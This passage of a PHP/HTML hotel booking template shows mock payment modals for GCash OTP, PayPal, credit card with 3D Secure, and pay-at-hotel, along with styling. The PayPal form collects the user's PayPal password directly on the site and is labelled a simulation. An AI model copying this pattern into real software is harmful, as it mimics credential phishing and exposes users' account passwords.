                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                </div>
                <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;">Didn't receive code? <a href="#" onclick="resendGCashOTP(); return false;" style="color: #0070E0;">Resend</a></p>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="showGCashForm()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Back</button>
                    <button type="button" onclick="verifyGCashOTP()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, #0070E0, #0055B8); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Verify & Pay</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- PayPal Modal -->
    <div id="paypalModal" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 450px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div style="padding: 30px;">
            <div style="text-align: center; margin-bottom: 25px;">
                <div style="width: 70px; height: 70px; background: linear-gradient(135deg, #003087, #0070BA); border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fab fa-paypal" style="font-size: 40px; color: white;"></i>
                </div>
                <h3 style="font-size: 22px; margin-bottom: 5px;">PayPal Payment</h3>
                <p style="font-size: 14px; color: #666;">Pay securely with your PayPal account</p>
            </div>
            <div id="paypalForm">
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Amount</label>
                    <input type="text" id="paypalAmount" readonly style="width: 100%; padding: 15px; border: 2px solid #003087; border-radius: 8px; font-size: 18px; font-weight: 700; text-align: center; background: #f8f9fa; color: #003087;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">PayPal Email *</label>
                    <input type="email" id="paypalEmail" placeholder="your.email@example.com" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 25px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Password *</label>
                    <input type="password" id="paypalPassword" placeholder="Your PayPal password" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                    <p style="font-size: 12px; color: #999; margin-top: 5px;"><i class="fas fa-info-circle"></i> This is a simulation - no real PayPal login</p>
                </div>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="closePaymentModal()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Cancel</button>
                    <button type="button" onclick="processPayPalPayment()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, #003087, #0070BA); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;"><i class="fab fa-paypal"></i> Pay Now</button>
                </div>
            </div>
            <div id="paypalLoadingSection" style="display: none; text-align: center; padding: 30px 0;">
                <div style="width: 70px; height: 70px; border: 4px solid #f3f3f3; border-top: 4px solid #003087; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
                <h4 style="font-size: 18px; margin-bottom: 10px;">Connecting to PayPal...</h4>
                <p style="font-size: 14px; color: #666;">Please wait while we process your payment</p>
            </div>
        </div>
    </div>
    
    <!-- Credit Card Modal -->
    <div id="creditCardModal" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 450px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div style="padding: 30px;">
            <div style="text-align: center; margin-bottom: 25px;">
                <div style="width: 70px; height: 70px; background: linear-gradient(135deg, var(--primary-color), var(--secondary-color)); border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="far fa-credit-card" style="font-size: 35px; color: white;"></i>
                </div>
                <h3 style="font-size: 22px; margin-bottom: 5px;">Credit Card Payment</h3>
                <p style="font-size: 14px; color: #666;">Pay securely with your credit card</p>
            </div>
            <div id="creditCardForm">
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Amount</label>
                    <input type="text" id="ccAmount" readonly style="width: 100%; padding: 15px; border: 2px solid var(--primary-color); border-radius: 8px; font-size: 18px; font-weight: 700; text-align: center; background: #f8f9fa; color: var(--primary-color);">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Card Number *</label>
                    <input type="text" id="ccNumber" placeholder="1234 5678 9012 3456" maxlength="19" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Card Holder Name *</label>
                    <input type="text" id="ccHolder" placeholder="JUAN DELA CRUZ" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px; text-transform: uppercase;">
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px;">
                    <div>
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Expiry Date *</label>
                        <input type="text" id="ccExpiry" placeholder="MM/YY" maxlength="5" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                    </div>
                    <div>
                        <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">CVV *</label>
                        <input type="text" id="ccCVV" placeholder="123" maxlength="3" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                    </div>
                </div>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="closePaymentModal()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Cancel</button>
                    <button type="button" onclick="processCreditCardPayment()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, var(--primary-color), var(--secondary-color)); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;"><i class="fas fa-lock"></i> Confirm Payment</button>
                </div>
            </div>
            <div id="ccOtpSection" style="display: none;">
                <div style="text-align: center; margin-bottom: 20px;">
                    <div style="width: 60px; height: 60px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                        <i class="fas fa-university" style="font-size: 28px; color: var(--success-color);"></i>
                    </div>
                    <h4 style="font-size: 18px; margin-bottom: 10px;">3D Secure Verification</h4>
                    <p style="font-size: 14px; color: #666;">Enter the OTP sent to your registered mobile</p>
                </div>
                <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 25px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                    <input type="text" class="cc-otp-input" maxlength="1" style="width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--gray-medium); border-radius: 8px;">
                </div>
                <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;">This is a simulated bank verification</p>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="showCreditCardForm()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Back</button>
                    <button type="button" onclick="verifyCCOTP()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, var(--primary-color), var(--secondary-color)); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Verify Payment</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Pay at Hotel Modal -->
    <div id="payAtHotelModal" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 450px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div style="padding: 30px;">
            <div style="text-align: center; margin-bottom: 25px;">
                <div style="width: 70px; height: 70px; background: linear-gradient(135deg, #28a745, #1e7e34); border-radius: 15px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <i class="fas fa-money-bill-wave" style="font-size: 35px; color: white;"></i>
                </div>
                <h3 style="font-size: 22px; margin-bottom: 5px;">Pay at Hotel</h3>
                <p style="font-size: 14px; color: #666;">Complete payment during check-in</p>
            </div>
            <div id="payAtHotelForm">
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Full Name *</label>
                    <input type="text" id="hotelFullName" placeholder="Juan Dela Cruz" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Mobile Number *</label>
                    <input type="tel" id="hotelMobile" placeholder="09XXXXXXXXX" maxlength="11" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Email *</label>
                    <input type="email" id="hotelEmail" placeholder="your.email@example.com" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Expected Arrival Time (Optional)</label>
                    <input type="time" id="hotelArrivalTime" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                </div>
                <div style="margin-bottom: 20px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Payment Option</label>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <label style="border: 2px solid var(--primary-color); border-radius: 8px; padding: 15px; cursor: pointer; text-align: center;">
                            <input type="radio" name="hotel_payment_option" value="full" checked style="display: none;" onchange="updateHotelPaymentAmount()">
                            <div style="font-weight: 600; color: var(--primary-color);">Full Payment</div>
                            <div id="fullAmountDisplay" style="font-size: 13px; color: #666; margin-top: 5px;">₱0.00</div>
                        </label>
                        <label style="border: 2px solid var(--gray-medium); border-radius: 8px; padding: 15px; cursor: pointer; text-align: center;">
                            <input type="radio" name="hotel_payment_option" value="partial" style="display: none;" onchange="updateHotelPaymentAmount()">
                            <div style="font-weight: 600; color: #666;">Partial Payment</div>
                            <div style="font-size: 13px; color: #666; margin-top: 5px;">Pay at hotel</div>
                        </label>
                    </div>
                </div>
                <div id="partialPaymentSection" style="display: none; margin-bottom: 20px; padding: 15px; background: #fff3cd; border-radius: 8px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Partial Amount to Pay Now</label>
                    <input type="number" id="partialAmount" placeholder="Enter amount" min="100" style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px;">
                    <p style="font-size: 12px; color: #856404; margin-top: 5px;"><i class="fas fa-info-circle"></i> Minimum ₱100. Balance due at check-in.</p>
                </div>
                <div style="margin-bottom: 25px;">
                    <label style="display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px;">Special Notes (Optional)</label>
                    <textarea id="hotelSpecialNotes" rows="3" placeholder="Any special requests or notes for your arrival..." style="width: 100%; padding: 15px; border: 1px solid var(--gray-medium); border-radius: 8px; font-size: 15px; resize: vertical;"></textarea>
                </div>
                <div style="display: flex; gap: 15px;">
                    <button type="button" onclick="closePaymentModal()" style="flex: 1; padding: 15px; border: 2px solid var(--gray-medium); background: white; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;">Cancel</button>
                    <button type="button" onclick="processPayAtHotel()" style="flex: 2; padding: 15px; background: linear-gradient(135deg, #28a745, #1e7e34); color: white; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; font-weight: 600;"><i class="fas fa-check"></i> Confirm Booking</button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Receipt Modal -->
    <div id="receiptModal" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div id="receiptContent"></div>
    </div>
    
    <!-- Processing Loader -->
    <div id="processingLoader" class="payment-modal" style="display: none; background: white; border-radius: 15px; max-width: 400px; width: 90%; padding: 40px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
        <div style="width: 80px; height: 80px; border: 5px solid #f3f3f3; border-top: 5px solid var(--primary-color); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px;"></div>
        <h3 style="font-size: 20px; margin-bottom: 10px;">Processing Payment...</h3>
        <p id="processingText" style="font-size: 14px; color: #666;">Please do not close this window</p>
    </div>
</div>

<style>
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
.payment-method-card { transition: all 0.3s ease; }
.payment-method-card:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
.payment-method-card.selected { border-color: var(--primary-color) !important; background-color: var(--gray-light) !important; }
.payment-modal-overlay { animation: fadeIn 0.3s ease; }
.payment-modal { animation: slideUp 0.3s ease; }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
@keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
.otp-input:focus, .cc-otp-input:focus { outline: none; border-color: var(--primary-color) !important; }
@media (max-width: 768px) { .payment-modal { max-width: 95% !important; margin: 10px; } }
</style>

<?php require_once 'includes/footer.php'; ?>
